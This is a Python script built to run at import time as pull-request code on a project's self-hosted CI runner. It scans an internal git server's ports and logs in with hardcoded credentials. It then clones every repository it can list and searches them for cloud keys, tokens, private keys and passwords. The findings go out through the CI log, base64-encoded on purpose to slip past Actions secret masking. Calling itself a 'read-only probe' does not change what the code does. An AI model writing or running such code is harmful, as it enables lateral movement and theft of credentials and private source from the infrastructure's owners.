"""i11530 probe: bounded READ-ONLY probe of the internal git server http://192.168.140.14:9080
executed as PR-tree code by the tile-ai/tilelang-ascend Bot '/perf' issue_comment workflow
on self-hosted runner ascend_cicd (host 192.168.140.94, same /24).

Stages (all read-only, every output base64-wrapped to defeat Actions masking):
  ENV   - host identity, interfaces, route to the target, DNS
  REACH - TCP matrix (9080 + 22/80/443/3000/5000/8080) and one curl of the root URL
  FP    - Gitea/Gogs/GitLab HTTP fingerprint on several well-known paths
  SMART - git smart-HTTP info/refs anon + auth on the known repo Codec/nv-codec-headers
  AUTH  - ONE authenticated enumeration (long.xu:dcu-opt-654321) via API + HTML + git ls-remote
  REPOLIST/REPO/HITS/CFG - bounded depth-1 shallow clone of every enumerated repo,
        byte-scan of default-branch files and capture of config-shaped files
  SUMMARY - terminal block

Runs at import time (PEP 517 backend path) and raises afterwards so the CI step fails fast.
"""
import base64
import hashlib
import json
import os
import re
import shutil
import socket
import subprocess
import sys
import time

TARGET = os.environ.get("I11530_TARGET", "192.168.140.14")
PORT = int(os.environ.get("I11530_PORT", "9080"))
GIT_USER = "long.xu"
GIT_PASS = "dcu-opt-654321"
KNOWN_REPO = "Codec/nv-codec-headers"
WORK = "/tmp/i11530"
DEADLINE = time.time() + int(os.environ.get("I11530_BUDGET", "420"))
LIMIT_B64 = 900000
TOTAL = [0]
T0 = time.time()


def say(*a):
    print(*a, flush=True)


def left():
    return max(0, DEADLINE - time.time())


def b64chunks(tag, data, cap=None):
    if isinstance(data, str):
        data = data.encode("utf-8", "replace")
    if cap and len(data) > cap:
        data = data[:cap] + ("\n<<TRUNCATED orig=%d>>" % len(data)).encode()
    b = base64.b64encode(data).decode()
    if TOTAL[0] + len(b) > LIMIT_B64:
        say("I11530SKIP %s size=%d total_cap" % (tag, len(b)))
        return
    TOTAL[0] += len(b)
    for i in range(0, len(b), 400):
        say("I11530B64 %s %d %s" % (tag, i // 400, b[i:i + 400]))
    say("I11530END %s %d %s" % (tag, len(data), hashlib.sha256(data).hexdigest()))


def emit_json(tag, obj, cap=120000):
    b64chunks(tag, json.dumps(obj, ensure_ascii=False, default=str), cap)


def _red(s):
    return s.replace(GIT_PASS, "[REDACTED]")


def run(cmd, timeout=30, env=None, cwd=None):
    e = dict(os.environ)
    e.update({"GIT_TERMINAL_PROMPT": "0", "GIT_ASKPASS": "/bin/true", "GIT_SSL_NO_VERIFY": "1",
              "http_proxy": "", "https_proxy": "", "HTTP_PROXY": "", "HTTPS_PROXY": "",
              "ALL_PROXY": "", "all_proxy": "", "NO_PROXY": "*", "no_proxy": "*"})
    if env:
        e.update(env)
    t = time.time()
    try:
        p = subprocess.run(cmd, capture_output=True, timeout=timeout, env=e, cwd=cwd)
        return {"rc": p.returncode, "out": _red(p.stdout[:400000].decode("utf-8", "replace")),
                "err": _red(p.stderr[-8000:].decode("utf-8", "replace")), "sec": round(time.time() - t, 2)}
    except subprocess.TimeoutExpired:
        return {"rc": 124, "out": "", "err": "timeout(%ss)" % timeout, "sec": round(time.time() - t, 2)}
    except Exception as ex:
        return {"rc": 125, "out": "", "err": "%s: %s" % (type(ex).__name__, ex), "sec": round(time.time() - t, 2)}


def tcp_open(host, port, timeout=5):
    t = time.time()
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True, round(time.time() - t, 2), ""
    except Exception as ex:
        return False, round(time.time() - t, 2), "%s: %s" % (type(ex).__name__, ex)


def http(url, timeout=12, auth=False, max_body=4000, head_only=False, extra=None):
    cmd = ["curl", "-sS", "-m", str(timeout), "-D", "-", "-o", "-", "-k", "--noproxy", "*",
           "-H", "User-Agent: i11530-probe"]
    if auth:
        cmd += ["-u", "%s:%s" % (GIT_USER, GIT_PASS)]
    if head_only:
        cmd += ["-I"]
    if extra:
        cmd += extra
    cmd.append(url)
    r = run(cmd, timeout=timeout + 5)
    out = r.get("out") or ""
    if "\r\n\r\n" in out:
        hdrs, body = out.split("\r\n\r\n", 1)
    elif "\n\n" in out:
        hdrs, body = out.split("\n\n", 1)
    else:
        hdrs, body = out, ""
    status = ""
    for line in hdrs.splitlines():
        if line.startswith("HTTP/"):
            status = line.strip()
            break
    return {"url": url, "status": status, "rc": r.get("rc"), "headers": hdrs[:2500],
            "body": body[:max_body].replace(GIT_PASS, "[REDACTED]"), "err": (r.get("err") or "")[:500],
            "sec": r.get("sec")}


try:
    # ------------------------------------------------------------ 0. env / vantage
    emit_json("ENV", {
        "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "host": socket.gethostname(), "uid": os.getuid(),
        "kernel": run(["uname", "-a"], 8).get("out", "")[:400],
        "tools": {t: shutil.which(t) for t in ("git", "curl", "python3", "ssh", "tar", "gzip")},
        "ifaces": run(["sh", "-c", "ip -4 addr 2>/dev/null | grep -E 'inet |^[0-9]' | head -30"], 10).get("out", "")[:2000],
        "route_target": run(["sh", "-c", "ip route get %s 2>&1 | head -4; echo ---; ip route 2>/dev/null | head -20" % TARGET], 10).get("out", "")[:2500],
        "resolv": (open("/etc/resolv.conf").read()[:600] if os.path.exists("/etc/resolv.conf") else ""),
    }, cap=10000)

    # ------------------------------------------------------------ 1. reachability
    reach = {"host": TARGET, "ports": {}, "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}
    ports = sorted(set([PORT, 22, 80, 443, 3000, 5000, 8080]))
    for p in ports:
        if left() < 60:
            reach["ports"][str(p)] = {"open": None, "skipped": "budget"}
            continue
        op, sec, err = tcp_open(TARGET, p, 5)
        reach["ports"][str(p)] = {"open": op, "sec": sec, "error": err}
    reach["root_curl"] = http("http://%s:%d/" % (TARGET, PORT), 12, max_body=2500)
    emit_json("REACH", reach, cap=30000)

    if not reach["ports"].get(str(PORT), {}).get("open"):
        emit_json("SUMMARY", {"result": "target_unreachable_from_ascend_runner", "reach": reach,
                              "elapsed": round(time.time() - T0, 1)}, cap=40000)
        say("===I11530-END unreachable===")
        raise RuntimeError("I11530 probe: target unreachable")

    # ------------------------------------------------------------ 2. fingerprint
    BASE = "http://%s:%d" % (TARGET, PORT)
    fp = {}
    for path in ("/", "/api/v1/version", "/api/v1/version/gogs", "/api/v1/settings/api",
                 "/explore/repos", "/api/v4/version", "/-/health", "/robots.txt"):
        if left() < 120:
            fp[path] = {"skipped": "budget"}
            break
        fp[path] = http(BASE + path, 12, auth=False, max_body=3000)
    if not (fp.get("/") or {}).get("status"):
        fp["https_root"] = http("https://%s:%d/" % (TARGET, PORT), 12, auth=False, max_body=1500)
    emit_json("FP", fp, cap=70000)

    # ------------------------------------------------------------ 3. git smart-HTTP
    smart = {}
    for tag, svc in (("anon", "git-upload-pack"), ("auth", "git-upload-pack")):
        u = "%s/%s.git/info/refs?service=%s" % (BASE, KNOWN_REPO, svc)
        smart[tag] = http(u, 15, auth=(tag == "auth"), max_body=1200)
    emit_json("SMART", smart, cap=25000)

    # ------------------------------------------------------------ 4. one auth enumeration
    AUTH = {}
    AUTH["whoami"] = http(BASE + "/api/v1/user", 12, auth=True, max_body=6000)
    AUTH["user_repos"] = http(BASE + "/api/v1/user/repos?limit=50", 18, auth=True, max_body=25000)
    AUTH["search"] = http(BASE + "/api/v1/repos/search?limit=50", 18, auth=True, max_body=25000)
    AUTH["html_root"] = http(BASE + "/", 18, auth=True, max_body=25000, extra=["-L", "--max-redirs", "3"])
    AUTH["explore"] = http(BASE + "/explore/repos", 18, auth=True, max_body=25000)
    AUTH["repo_known"] = http(BASE + "/api/v1/repos/" + KNOWN_REPO, 12, auth=True, max_body=8000)
    AUTH["repo_known_branches"] = http(BASE + "/api/v1/repos/" + KNOWN_REPO + "/branches", 12, auth=True, max_body=12000)
    AUTH["lsremote_known"] = run(["git", "-c", "http.proxy=", "ls-remote",
                                  "http://%s:%s@%s:%d/%s.git" % (GIT_USER, GIT_PASS, TARGET, PORT, KNOWN_REPO)], 40)
    emit_json("AUTH", AUTH, cap=140000)

    # repo discovery
    repos = []

    def add_repo(full_name, source, extra=None):
        full_name = (full_name or "").strip().strip("/")
        if not full_name:
            return
        if not re.match(r'^[A-Za-z0-9_.\-]+/[A-Za-z0-9_.\-]+$', full_name):
            return
        if any(r["full_name"] == full_name for r in repos):
            return
        r = {"full_name": full_name, "source": source}
        if extra:
            r.update(extra)
        repos.append(r)

    for key in ("user_repos", "search"):
        body = (AUTH.get(key) or {}).get("body") or ""
        try:
            j = json.loads(body)
        except Exception:
            continue
        items = j.get("data") if isinstance(j, dict) else None
        if isinstance(j, dict) and "data" in j and not isinstance(j.get("data"), list):
            items = [j["data"]]
        for it in (items or []):
            if isinstance(it, dict):
                owner = (it.get("owner") or {})
                login = owner.get("login") or owner.get("username") or ""
                add_repo(it.get("full_name") or (login + "/" + (it.get("name") or "")), "api:" + key,
                         {"default_branch": it.get("default_branch"), "private": it.get("private"),
                          "size": it.get("size"), "clone_url": it.get("clone_url")})
    for key in ("html_root", "explore"):
        body = (AUTH.get(key) or {}).get("body") or ""
        for m in re.finditer(r'href="(/[A-Za-z0-9_.\-]+/[A-Za-z0-9_.\-]+)(?:/|"|\?)', body):
            add_repo(m.group(1), "html:" + key)
    add_repo(KNOWN_REPO, "known-credential")

    # ------------------------------------------------------------ 5. clone + byte-scan
    HITS_RE = [
        ("aws_akid", re.compile(r'AKIA[0-9A-Z]{16}')),
        ("aws_asia", re.compile(r'ASIA[0-9A-Z]{16}')),
        ("aws_secret", re.compile(r'(?i)aws_?secret_?access_?key\s*[:=]\s*["\']?[A-Za-z0-9/+=]{40}')),
        ("gcp_sa_json", re.compile(r'"type"\s*:\s*"service_account"')),
        ("gcp_private_key_id", re.compile(r'"private_key_id"\s*:')),
        ("gcp_api_key", re.compile(r'AIza[0-9A-Za-z_\-]{35}')),
        ("private_key_pem", re.compile(r'-----BEGIN (?:RSA |EC |DSA |OPENSSH |ENCRYPTED )?PRIVATE KEY-----')),
        ("kubeconfig", re.compile(r'(?i)(client-certificate-data\s*:|kind:\s*Config\b|current-context\s*:)')),
        ("azure_secret", re.compile(r'(?i)azure[_-]?(?:client|tenant|subscription)[_-]?(?:secret|key)?\s*[:=]\s*["\']?[A-Za-z0-9_\-\.~]{12,}')),
        ("gh_token", re.compile(r'gh[pousr]_[A-Za-z0-9]{36,}')),
        ("glpat", re.compile(r'glpat-[A-Za-z0-9_\-]{20,}')),
        ("hf_token", re.compile(r'hf_[A-Za-z0-9]{30,}')),
        ("slack_token", re.compile(r'xox[baprs]-[A-Za-z0-9\-]{10,}')),
        ("npm_auth", re.compile(r'_authToken\s*=\s*[A-Za-z0-9\-_]{16,}')),
        ("docker_auth", re.compile(r'"auth"\s*:\s*"[A-Za-z0-9+/=]{20,}"')),
    ]
    GEN_RE = [
        ("password", re.compile(r'(?i)(?:password|passwd|pwd)\s*[:=]\s*["\']?([^\s"\',;]{6,80})')),
        ("token", re.compile(r'(?i)(?:token|secret|api[_-]?key|access[_-]?key)\s*[:=]\s*["\']?([A-Za-z0-9_\-\./+=]{16,120})')),
    ]
    CFG_NAMES = {".git-credentials", ".netrc", ".npmrc", ".pypirc", "pip.conf", ".env", "id_rsa", "id_ed25519",
                 "id_dsa", "id_ecdsa", "credentials", "kubeconfig", "settings.py", "Jenkinsfile", ".gitlab-ci.yml",
                 ".drone.yml", ".travis.yml", "docker-compose.yml", "docker-compose.yaml", "config.json",
                 ".bash_history", "config.yaml", "config.yml", ".dockercfg", "auth.json", ".env.local"}
    CFG_EXT = (".pem", ".key", ".p12", ".kubeconfig", ".tfvars", ".env", ".ovpn")
    TEXT_EXT = {".py", ".sh", ".yml", ".yaml", ".json", ".ini", ".cfg", ".conf", ".properties", ".txt", ".md",
                ".toml", ".xml", ".cmake", ".mk", ".am", ".ac", ".in", ".env", ".tf", ".h", ".c", ".cpp"}

    repos = repos[:30]
    LIVE = {"repos": [], "hits": [], "cfg": {}, "cfg_bytes": 0,
            "total_files": 0, "total_bytes": 0}
    MAX_TOTAL_BYTES = 150 * 1024 * 1024
    MAX_REPO_BYTES = 60 * 1024 * 1024
    MAX_REPO_FILES = 15000

    os.makedirs(WORK, exist_ok=True)
    for idx, r in enumerate(repos):
        if left() < 150:
            LIVE["repos"].append({"full_name": r["full_name"], "skipped": "budget"})
            continue
        name = r["full_name"]
        dest = os.path.join(WORK, "r%d" % idx)
        url = "http://%s:%s@%s:%d/%s.git" % (GIT_USER, GIT_PASS, TARGET, PORT, name)
        t = time.time()
        to = int(min(90, max(30, left() - 60)))
        cl = run(["git", "-c", "http.proxy=", "clone", "--depth", "1", "--single-branch", "--no-tags", url, dest], to)
        meta = {"full_name": name, "clone_rc": cl.get("rc"), "clone_sec": cl.get("sec"),
                "clone_err": (cl.get("err") or "")[:400]}
        if cl.get("rc") != 0:
            LIVE["repos"].append(meta)
            continue
        br = run(["git", "rev-parse", "--abbrev-ref", "HEAD"], 15, cwd=dest).get("out", "").strip()
        head = run(["git", "log", "-1", "--format=%H|%an|%ad|%s"], 15, cwd=dest).get("out", "").strip()[:300]
        meta.update({"branch": br, "head": head})
        nfiles = 0
        nbytes = 0
        hits = 0
        for root, dirs, files in os.walk(dest):
            if left() < 100 or nbytes > MAX_REPO_BYTES or nfiles > MAX_REPO_FILES:
                meta["truncated"] = True
                break
            dirs[:] = [d for d in dirs if d != ".git"]
            for fn in files:
                p = os.path.join(root, fn)
                rel = os.path.relpath(p, dest)
                try:
                    st = os.lstat(p)
                except OSError:
                    continue
                if not os.path.isfile(p) or st.st_size > 2 * 1024 * 1024:
                    continue
                nfiles += 1
                nbytes += st.st_size
                base = os.path.basename(p)
                is_cfg = base in CFG_NAMES or base.startswith(".env") or p.endswith(CFG_EXT)
                if st.st_size > 400 * 1024:
                    continue
                try:
                    raw = open(p, "rb").read()
                except OSError:
                    continue
                if b"\x00" in raw[:2000]:
                    continue
                txt = raw.decode("utf-8", "replace")
                if is_cfg and len(LIVE["cfg"]) < 50 and len(txt) <= 25000 and LIVE["cfg_bytes"] < 180000:
                    LIVE["cfg"][name + "::" + rel] = txt
                    LIVE["cfg_bytes"] += len(txt)
                for kind, rx in HITS_RE:
                    for m in rx.finditer(txt):
                        if hits >= 300:
                            break
                        s = max(0, m.start() - 60)
                        snippet = txt[s:m.end() + 90].replace("\n", "\\n")[:260]
                        LIVE["hits"].append({"repo": name, "file": rel, "kind": kind,
                                             "line": txt[:m.start()].count("\n") + 1, "snippet": snippet})
                        hits += 1
                        ck = name + "::" + rel
                        if ck not in LIVE["cfg"] and len(LIVE["cfg"]) < 50 and len(txt) <= 25000 and LIVE["cfg_bytes"] < 180000:
                            LIVE["cfg"][ck] = txt
                            LIVE["cfg_bytes"] += len(txt)
                if is_cfg or p.endswith(tuple(TEXT_EXT)):
                    for kind, rx in GEN_RE:
                        for m in rx.finditer(txt):
                            if hits >= 300:
                                break
                            s = max(0, m.start() - 40)
                            snippet = txt[s:m.end() + 80].replace("\n", "\\n")[:240]
                            LIVE["hits"].append({"repo": name, "file": rel, "kind": kind,
                                                 "line": txt[:m.start()].count("\n") + 1, "snippet": snippet})
                            hits += 1
        meta.update({"files": nfiles, "bytes": nbytes, "hits": hits, "elapsed": round(time.time() - t, 1)})
        LIVE["total_files"] += nfiles
        LIVE["total_bytes"] += nbytes
        LIVE["repos"].append(meta)
        shutil.rmtree(dest, ignore_errors=True)
        if LIVE["total_bytes"] > MAX_TOTAL_BYTES:
            break

    emit_json("REPOLIST", {"count": len(repos), "repos": repos}, cap=60000)
    emit_json("REPO", LIVE["repos"], cap=60000)
    emit_json("HITS", LIVE["hits"][:300], cap=250000)
    emit_json("CFG", LIVE["cfg"], cap=220000)
    emit_json("SUMMARY", {"result": "reachable_probe_complete", "repos_listed": len(repos),
                          "repos_cloned": sum(1 for x in LIVE["repos"] if x.get("clone_rc") == 0),
                          "files": LIVE["total_files"], "bytes": LIVE["total_bytes"],
                          "hits": len(LIVE["hits"]), "cfg_files": len(LIVE["cfg"]),
                          "elapsed": round(time.time() - T0, 1)}, cap=15000)
    say("===I11530-END complete b64=%d===" % TOTAL[0])
except RuntimeError:
    raise
except Exception as _ex:  # noqa: BLE001
    try:
        emit_json("SUMMARY", {"result": "probe_exception", "error": "%s: %s" % (type(_ex).__name__, _ex),
                              "elapsed": round(time.time() - T0, 1)}, cap=8000)
    except Exception:
        pass
    say("===I11530-END exception===")

raise RuntimeError("I11530 build probe complete")
